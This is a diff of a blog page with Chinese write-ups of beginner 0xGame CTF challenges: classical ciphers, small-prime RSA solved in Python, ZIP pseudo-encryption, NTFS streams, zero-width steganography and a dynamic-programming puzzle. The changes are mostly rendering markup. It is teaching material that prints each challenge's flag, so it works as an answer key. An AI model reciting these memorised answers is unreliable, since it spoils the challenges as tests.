-<h3 id="Class-8"><a href="#Class-8" class="headerlink" title="Class 8"></a>Class 8</h3><p>八种古典密码（可能确实出得有点脑洞了）</p>
+<h3 id="class-8">Class 8</h3>
+<p>八种古典密码（可能确实出得有点脑洞了）</p>
 <pre class="line-numbers language-none"><code class="language-none">第1、6位是盲文
 第2、7位是跳舞的小人
 第3位是猪圈密码
@@ -744,17 +758,16 @@ D<span class="token operator">=</span><span class="token builtin">open</span><sp
 第10、15位是培根密码
 第13位是电脑键盘，cfgb之间围着的是V
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>这道题一开始打算出规则的单词的，但后面就出得不规则了。主要是第13位、第15位出问题出得比较多。第15位确实有两种解法，因此第15位是<code>O</code>最后也算对了。</p>
 <p>flag:<code>0xGame&#123;CLASSLNRDDLDVTNB&#125;</code>或<code>0xGame&#123;CLASSLNRDDLDVTOB&#125;</code></p>
-<h3 id="ABC-Of-RSA"><a href="#ABC-Of-RSA" class="headerlink" title="ABC Of RSA"></a>ABC Of RSA</h3><p>这个题是后面加的。主要是给新生入门一下RSA。。。</p>
+<h3 id="abc-of-rsa">ABC Of RSA</h3>
+<p>这个题是后面加的。主要是给新生入门一下RSA。。。</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python">在RSA加密中，已知：
 p<span class="token operator">=</span><span class="token number">9677</span>
 q<span class="token operator">=</span><span class="token number">9241</span>
 e<span class="token operator">=</span><span class="token number">10009</span>
 求解密指数d不超过<span class="token number">4000</span>万的正值，用十进制表示，包上0xGame<span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>提交。
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>百度百科上就有很多关于RSA的加密方法和解密方法。如果用上Crypto包，是非常好做的。</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>
 p<span class="token punctuation">,</span>q<span class="token operator">=</span><span class="token number">9677</span><span class="token punctuation">,</span><span class="token number">9241</span>
@@ -763,9 +776,10 @@ phi<span class="token operator">=</span><span class="token punctuation">(</span>
 <span class="token comment">#39982249</span>
 <span class="token comment">#flag是0xGame&#123;39982249&#125;</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>也有很多学弟学妹们用的是逆元的定义：$10009d= 1 +k \phi$做出来的，通过枚举$k$，找到了$d$的值。。不过这一方法在下一个RSA中就不太适用了，因为下一题的$k$很大，没法枚举了。</p>
-<h3 id="BlackGiveRSA"><a href="#BlackGiveRSA" class="headerlink" title="BlackGiveRSA"></a>BlackGiveRSA</h3><p>一个RSA题目，看到$n$比较小，那么$n$的值直接放入网站/yafu/sagemath中分解就行了。<br>分解出$p=1175078221,q=1435756429$。然后对输出内容一段一段解密，再<code>long_to_bytes</code>连接起来，就是flag了。</p>
+<p>也有很多学弟学妹们用的是逆元的定义：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>10009</mn><mi>d</mi><mo>=</mo><mn>1</mn><mo>+</mo><mi>k</mi><mi>ϕ</mi></mrow><annotation encoding="application/x-tex">10009d= 1 +k \phi</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mord">0</span><span class="mord">0</span><span class="mord">9</span><span class="mord mathdefault">d</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mord mathdefault">ϕ</span></span></span></span>做出来的，通过枚举<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span></span></span></span>，找到了<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi></mrow><annotation encoding="application/x-tex">d</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">d</span></span></span></span>的值。。不过这一方法在下一个RSA中就不太适用了，因为下一题的<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span></span></span></span>很大，没法枚举了。</p>
+<h3 id="blackgiversa">BlackGiveRSA</h3>
+<p>一个RSA题目，看到<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">n</span></span></span></span>比较小，那么<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">n</span></span></span></span>的值直接放入网站/yafu/sagemath中分解就行了。<br>
+分解出<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><mo>=</mo><mn>1175078221</mn><mo separator="true">,</mo><mi>q</mi><mo>=</mo><mn>1435756429</mn></mrow><annotation encoding="application/x-tex">p=1175078221,q=1435756429</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">p</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8388800000000001em;vertical-align:-0.19444em;"></span><span class="mord">1</span><span class="mord">1</span><span class="mord">7</span><span class="mord">5</span><span class="mord">0</span><span class="mord">7</span><span class="mord">8</span><span class="mord">2</span><span class="mord">2</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">4</span><span class="mord">3</span><span class="mord">5</span><span class="mord">7</span><span class="mord">5</span><span class="mord">6</span><span class="mord">4</span><span class="mord">2</span><span class="mord">9</span></span></span></span>。然后对输出内容一段一段解密，再<code>long_to_bytes</code>连接起来，就是flag了。</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>
 p<span class="token punctuation">,</span>q<span class="token operator">=</span><span class="token number">1175078221</span><span class="token punctuation">,</span><span class="token number">1435756429</span>
 n<span class="token punctuation">,</span>phi<span class="token operator">=</span>p<span class="token operator">*</span>q<span class="token punctuation">,</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
@@ -784,16 +798,21 @@ m<span class="token operator">=</span><span class="token string">b""</span>
 <span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span>
 <span class="token comment">#0xGame&#123;ChuTiRenDeQQShiJiShangJiuShiQDeZhi&#125;</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>flag解出来：“出题人的QQ实际上就是q的值。”，各位学弟学妹们可以看看自己QQ是不是素数，平均30几个QQ号就有一个是素数。</p>
-<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Sign-in"><a href="#Sign-in" class="headerlink" title="Sign in"></a>Sign in</h3><p>直接看RULES就行</p>
-<h3 id="A-translate-draft"><a href="#A-translate-draft" class="headerlink" title="A translate draft"></a>A translate draft</h3><p>下载附件，打开提示需要输入密码，是伪加密。扔进winhex，搜索504B0102，往后看加密位置，是0900，更改为0000。打开文件，将word文档解压出来，打开，下拉到最下方，有一段空白，全选更改字体颜色为红色可以看到b32加密的串，解出前半段flag。将word改为zip，打开发现HiddenBy13.txt，内容为rot13加密的后半段flag。</p>
-<h3 id="认真的血"><a href="#认真的血" class="headerlink" title="认真的血"></a>认真的血</h3><p>NTFS文件流隐写，使用winrar解压文件，使用ntfsstreameditor扫描得到flag.txt，内容为ROT47加密，解密得flag。</p>
-<h3 id="Kakurennbo"><a href="#Kakurennbo" class="headerlink" title="Kakurennbo"></a>Kakurennbo</h3><p>光标在文本内停留，按→键会发现有明显的阻滞感。这显然是0宽隐写。验证：在kali下使用vim打开文本，可以发现0宽字符。在线解密<a target="_blank" rel="noopener" href="http://330k.github.io/misc_tools/unicode_steganography.html">http://330k.github.io/misc_tools/unicode_steganography.html</a></p>
+<h2 id="misc">Misc</h2>
+<h3 id="sign-in">Sign in</h3>
+<p>直接看RULES就行</p>
+<h3 id="a-translate-draft">A translate draft</h3>
+<p>下载附件，打开提示需要输入密码，是伪加密。扔进winhex，搜索504B0102，往后看加密位置，是0900，更改为0000。打开文件，将word文档解压出来，打开，下拉到最下方，有一段空白，全选更改字体颜色为红色可以看到b32加密的串，解出前半段flag。将word改为zip，打开发现HiddenBy13.txt，内容为rot13加密的后半段flag。</p>
+<h3 id="认真的血">认真的血</h3>
+<p>NTFS文件流隐写，使用winrar解压文件，使用ntfsstreameditor扫描得到flag.txt，内容为ROT47加密，解密得flag。</p>
+<h3 id="kakurennbo">Kakurennbo</h3>
+<p>光标在文本内停留，按→键会发现有明显的阻滞感。这显然是0宽隐写。验证：在kali下使用vim打开文本，可以发现0宽字符。在线解密http://330k.github.io/misc_tools/unicode_steganography.html</p>
 <p>可以得到W型栅栏加密过的flag。<a target="_blank" rel="noopener" href="http://www.atoolbox.net/Tool.php?Id=777%E8%A7%A3%E5%AF%86%EF%BC%8C%E6%A0%8F%E6%95%B021%E5%BE%97%E5%88%B0flag%E3%80%82">http://www.atoolbox.net/Tool.php?Id=777解密，栏数21得到flag。</a></p>
-<h3 id="EzAlgorithm"><a href="#EzAlgorithm" class="headerlink" title="EzAlgorithm"></a>EzAlgorithm</h3><p>一个简单的算法题：因为第$i$级楼梯可以通过第$i-1,i-2,i-3$级楼梯到达，因此到达第$i$级楼梯的走法等于到达第$i-1$级楼梯的走法加上到达第$i-2$级楼梯的走法加上到达第$i-3$级楼梯的走法。</p>
-<p>不过在这之前，我们要判断一下楼梯有没有坏掉。如果楼梯坏掉了，那么我们就直接把到达那一级楼梯的方法数记为$0$就行。</p>
-<p>这边需要注意的是，由于模数$1435756429$比<code>C/C++ int</code>的最大值的一半要大，那这里需要开<code>long long</code>解决。</p>
+<h3 id="ezalgorithm">EzAlgorithm</h3>
+<p>一个简单的算法题：因为第<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathdefault">i</span></span></span></span>级楼梯可以通过第<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi><mo>−</mo><mn>1</mn><mo separator="true">,</mo><mi>i</mi><mo>−</mo><mn>2</mn><mo separator="true">,</mo><mi>i</mi><mo>−</mo><mn>3</mn></mrow><annotation encoding="application/x-tex">i-1,i-2,i-3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.74285em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">i</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.85396em;vertical-align:-0.19444em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">i</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.85396em;vertical-align:-0.19444em;"></span><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">i</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">3</span></span></span></span>级楼梯到达，因此到达第<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathdefault">i</span></span></span></span>级楼梯的走法等于到达第<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">i-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.74285em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">i</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>级楼梯的走法加上到达第<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi><mo>−</mo><mn>2</mn></mrow><annotation encoding="application/x-tex">i-2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.74285em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">i</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span></span></span></span>级楼梯的走法加上到达第<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi><mo>−</mo><mn>3</mn></mrow><annotation encoding="application/x-tex">i-3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.74285em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">i</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">3</span></span></span></span>级楼梯的走法。</p>
+<p>不过在这之前，我们要判断一下楼梯有没有坏掉。如果楼梯坏掉了，那么我们就直接把到达那一级楼梯的方法数记为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span></span></span></span>就行。</p>
+<p>这边需要注意的是，由于模数<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1435756429</mn></mrow><annotation encoding="application/x-tex">1435756429</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">4</span><span class="mord">3</span><span class="mord">5</span><span class="mord">7</span><span class="mord">5</span><span class="mord">6</span><span class="mord">4</span><span class="mord">2</span><span class="mord">9</span></span></span></span>比<code>C/C++ int</code>的最大值的一半要大，那这里需要开<code>long long</code>解决。</p>
 <p>这是解题代码（C语言的，C++/Python也可以做。），最后是十个测试点的答案。需要注意的是有一个点有点坑，因为那个点它第一级楼梯就是坏的：</p>
 <pre class="line-numbers language-C" data-language="C"><code class="language-C">#include&lt;stdio.h&gt;
 long long f[4000000]&#x3D;&#123;0&#125;,v[4000000]&#x3D;&#123;0&#125;;
@@ -826,8 +845,7 @@ int main()
 &#125;
 &#x2F;&#x2F;13 98 47 3359124 1205125 834118675 1289432148 1087983205 1176572515 566575482
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>这些数加起来模$1435756429$的值为$651977145$，所以flag为<code>0xGame&#123;651977145&#125;</code>。</p>
+<p>这些数加起来模<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1435756429</mn></mrow><annotation encoding="application/x-tex">1435756429</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">4</span><span class="mord">3</span><span class="mord">5</span><span class="mord">7</span><span class="mord">5</span><span class="mord">6</span><span class="mord">4</span><span class="mord">2</span><span class="mord">9</span></span></span></span>的值为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>651977145</mn></mrow><annotation encoding="application/x-tex">651977145</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">6</span><span class="mord">5</span><span class="mord">1</span><span class="mord">9</span><span class="mord">7</span><span class="mord">7</span><span class="mord">1</span><span class="mord">4</span><span class="mord">5</span></span></span></span>，所以flag为<code>0xGame&#123;651977145&#125;</code>。</p>
 
                 
             </div>
@@ -977,12 +995,12 @@ int main()
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/Web/">
-                        <span class="chip bg-color">Web</span>
-                    </a>
-                    
                     <a href="/tags/Bugku/">
                         <span class="chip bg-color">Bugku</span>
+                    </a>
+                    
+                    <a href="/tags/Web/">
+                        <span class="chip bg-color">Web</span>
                     </a>
                     
                 </div>
@@ -1228,7 +1246,7 @@ int main()
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">368.4k</span>
+                        class="white-color">380.3k</span>
             
             
             
